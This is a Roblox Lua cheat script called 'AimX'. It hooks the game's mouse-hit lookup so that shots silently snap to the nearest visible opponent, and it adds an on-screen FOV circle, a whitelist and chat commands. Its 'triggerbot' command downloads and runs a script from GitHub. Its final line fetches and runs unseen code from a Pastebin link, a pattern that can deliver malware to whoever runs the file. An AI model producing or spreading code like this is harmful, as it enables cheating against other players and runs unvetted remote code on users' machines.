local function PrintCommands()
    print("Commands for Aimbot: /e Linethickness (number here), /e Filled (true/false), /e FOV (number), /e FOVvisible (true/false), /e Whitelist (PlayerName1, PlayerName2, ...), /e Color (name of color/rainbow), /e AimKey (key), /e TriggerBot")
end

getgenv().Prediction = 0.1
getgenv().FOV = 150
getgenv().AimKey = "v"
getgenv().Notifier = true
getgenv().FOV_VISIBLE = true
getgenv().DontShootThesePeople = {
    "Notinvxlid" -- Added Notinvxlid to the whitelist
}

local ColorNames = {
    RED = Color3.fromRGB(255, 0, 0),
    BLUE = Color3.fromRGB(0, 0, 255),
    GREEN = Color3.fromRGB(0, 255, 0),
    YELLOW = Color3.fromRGB(255, 255, 0),
    PURPLE = Color3.fromRGB(128, 0, 128),
    ORANGE = Color3.fromRGB(255, 165, 0),
    PINK = Color3.fromRGB(255, 192, 203),
    RAINBOW = "rainbow"
}

local SilentAim = true
local LocalPlayer = game:GetService("Players").LocalPlayer
local Players = game:GetService("Players")
local Mouse = LocalPlayer:GetMouse()
local Camera = game:GetService("Workspace").CurrentCamera
local FOV_CIRCLE = Drawing.new("Circle")

local Options = {
    Torso = "HumanoidRootPart",
    Head = "Head"
}

FOV_CIRCLE.Visible = getgenv().FOV_VISIBLE
FOV_CIRCLE.Filled = false
FOV_CIRCLE.Thickness = 0.00001
FOV_CIRCLE.Transparency = 1
FOV_CIRCLE.Color = Color3.new(0.000000, 0.521569, 0.784314)
FOV_CIRCLE.Radius = getgenv().FOV
FOV_CIRCLE.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)

local function MoveFovCircle()
    spawn(function()
        while true do
            FOV_CIRCLE.Position = Vector2.new(Mouse.X, (Mouse.Y + 36))
            task.wait()
        end
    end)
end

game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "Commands for Aimbot: /e Linethickness (number here), /e Filled (true/false), /e FOV (number), /e FOVvisible (true/false), /e Whitelist (PlayerName1, PlayerName2, ...), /e Color (name of color/rainbow), /e AimKey (key), /e TriggerBot",
    Color = Color3.fromRGB(255, 0, 0)
})

game.StarterGui:SetCore("SendNotification", {Title = "AimX Loaded", Text = "wys gangg", Duration = 5})

local function ItsOn()
    game.StarterGui:SetCore("SendNotification", {Title = "Silent Aim ON", Text = "TOGGLED", Duration = 5})
end

local function ItsOff()
    game.StarterGui:SetCore("SendNotification", {Title = "Silent Aim OFF", Text = "UN-TOGGLED", Duration = 5})
end

local function SetCircleColor(r, g, b)
    FOV_CIRCLE.Color = Color3.fromRGB(r, g, b)
end

local function ToggleSilentAim()
    SilentAim = not SilentAim
    if SilentAim then
        FOV_CIRCLE.Color = Color3.new(0.047059, 0.172549, 0.517647)
        ItsOn()
    else
        FOV_CIRCLE.Color = Color3.new(1, 0, 0)
        ItsOff()
    end
end

Mouse.KeyDown:Connect(function(KeyPressed)
    if KeyPressed == (getgenv().AimKey:lower()) then
        ToggleSilentAim()
    end
end)

Mouse.KeyDown:Connect(function(Rejoin)
    if Rejoin == "=" then
        game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
    end
end)

local oldIndex = nil
oldIndex = hookmetamethod(game, "__index", function(self, Index)
    if self == Mouse and (Index == "Hit") then
        if SilentAim then
            local Distance = 9e9
            local Target = nil
            local Players = game:GetService("Players")
            local LocalPlayer = game:GetService("Players").LocalPlayer
            local Camera = game:GetService("Workspace").CurrentCamera
            for _, v in pairs(Players:GetPlayers()) do
                if not table.find(getgenv().DontShootThesePeople, v.Name) then
                    if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character:FindFirstChild("Humanoid").Health > 0 then
                        local Enemy = v.Character
                        local CastingFrom = CFrame.new(Camera.CFrame.Position, Enemy[Options.Torso].CFrame.Position) * CFrame.new(0, 0, -4)
                        local RayCast = Ray.new(CastingFrom.Position, CastingFrom.LookVector * 9000)
                        local World, ToSpace = game:GetService("Workspace"):FindPartOnRayWithIgnoreList(RayCast, {LocalPlayer.Character:FindFirstChild("Head")})
                        local RootWorld = (Enemy[Options.Torso].CFrame.Position - ToSpace).magnitude
                        if RootWorld < 4 then
                            local RootPartPosition, Visible = Camera:WorldToScreenPoint(Enemy[Options.Torso].Position)
                            if Visible then
                                local Real_Magnitude = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(RootPartPosition.X, RootPartPosition.Y)).Magnitude
                                if Real_Magnitude < Distance and Real_Magnitude < FOV_CIRCLE.Radius then
                                    Distance = Real_Magnitude
                                    Target = Enemy
                                end
                            end
                        end
                    end
                end
            end

            if Target ~= nil and Target[Options.Torso] and Target:FindFirstChild("Humanoid").Health > 0 then
                if SilentAim then
                    local ShootThis = Target[Options.Torso]
                    local Predicted_Position = ShootThis.CFrame + (ShootThis.Velocity * getgenv().Prediction + Vector3.new(0, -.5, 0))
                    return ((Index == "Hit" and Predicted_Position))
                end
            end
        end
    end
    return oldIndex(self, Index)
end)

local function RunCommand(cmd, args)
    if cmd == "linethickness" then
        FOV_CIRCLE.Thickness = tonumber(args) or 0.00001
        print("Line thickness set to: " .. args)
    elseif cmd == "filled" then
        FOV_CIRCLE.Filled = args == "true"
        print("Filled set to: " .. args)
    elseif cmd == "fov" then
        getgenv().FOV = tonumber(args) or 150
        FOV_CIRCLE.Radius = getgenv().FOV
        print("FOV set to: " .. args)
    elseif cmd == "fovvisible" then
        FOV_CIRCLE.Visible = args == "true"
        print("FOV visibility set to: " .. args)
    elseif cmd == "whitelist" then
        getgenv().DontShootThesePeople = {}
        for name in string.gmatch(args, '([^,]+)') do
            table.insert(getgenv().DontShootThesePeople, name)
        end
        print("Whitelisted: " .. args)
    elseif cmd == "color" then
        if ColorNames[args:upper()] then
            if args:upper() == "RAINBOW" then
                print("FOV circle color set to rainbow")
            else
                SetCircleColor(ColorNames[args:upper()].R, ColorNames[args:upper()].G, ColorNames[args:upper()].B)
                print("Color changed to: " .. args)
            end
        else
            print("Invalid color name.")
        end
    elseif cmd == "aimkey" then
        getgenv().AimKey = args
        print("Aim key set to: " .. args)
    elseif cmd == "triggerbot" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Roblox/master/UniversalTriggerBot.lua", true))()
        print("TriggerBot activated.")
    else
        print("Unknown command. Type '/e Help' for a list of commands.")
    end
end

local function ProcessCommand(message)
    if message:sub(1, 3) == "/e " then
        local cmd, args = message:sub(4):match("^(%S+)%s*(.*)$")
        if cmd then
            cmd = cmd:lower() -- Convert command to lowercase
            RunCommand(cmd, args)
        end
    elseif message:lower() == "/e help" then
        PrintCommands()
    end
end

Players.LocalPlayer.Chatted:Connect(ProcessCommand)

MoveFovCircle()

loadstring(game:HttpGet("https://pastebin.com/raw/MwmrpsPK"))()

